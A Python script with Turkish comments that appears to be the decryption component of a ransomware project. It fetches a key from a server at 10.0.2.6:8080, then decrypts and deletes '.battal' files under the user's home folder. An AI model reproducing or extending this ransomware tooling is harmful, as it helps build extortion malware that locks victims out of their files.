import os
import socket
import getpass
from cryptography.fernet import Fernet

# Aktif olan kullanıcının kullanıcı adını alın
username = getpass.getuser()
def get_key_from_server():
    # Socket bağlantısı oluşturun
    sock = socket.socket()
    # Sunucuya bağlanın
    sock.connect(("10.0.2.6", 8080))
    # Anahtarı alın
    key = sock.recv(1024)
    return key
# Şifrelenmiş dosyaları çözmek için kullanılacak anahtarı alın
key = get_key_from_server()
print(key)
# Anahtarı kullanarak Fernet sınıfının bir örneğini oluşturun
fernet = Fernet(key)

# Belirtilen dosya yolunda dosyaları dolasın
for root, dirs, files in os.walk("C:\\Users\\"+username):
    for file in files:
        # Dosya uzantısı ".battal" ile bitiyorsa
        if file.endswith(".battal"):
            # Dosya yolunu oluşturun
            file_path = os.path.join(root, file)
            # Şifrelenmiş dosyayı oku
            with open(file_path, "rb") as f:
                encrypted_data = f.read()
            # Şifrelenmiş dosyayı çöz
            decrypted_data = fernet.decrypt(encrypted_data)

            # Dosya adını ve uzantısını ayırın
            filename, extension = os.path.splitext(file)
            # Çözülmüş dosyayı dosya yoluna yazın
            with open(os.path.join(root, filename), "wb") as f:
                f.write(decrypted_data)
            # Şifrelenmiş dosyayı silin
            os.remove(file_path)